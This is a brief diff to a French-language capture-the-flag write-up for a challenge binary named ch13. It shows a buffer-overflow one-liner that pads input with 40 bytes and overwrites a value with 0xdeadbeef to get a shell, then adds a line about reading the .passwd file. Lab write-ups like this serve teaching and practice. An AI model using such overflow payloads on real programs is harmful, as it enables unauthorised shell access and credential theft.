@@ -18,3 +18,4 @@ On obtient la phrase "Yeah dude ! You win !" mais pas de shell. On va donc bloqu
 ```python
 (python -c 'print "A"*40 + "\xef\xbe\xad\xde"'; cat) | ./ch13
 ```
+On se retrouve avec un shell, il reste plus qu'a lire le fichier .passwd.
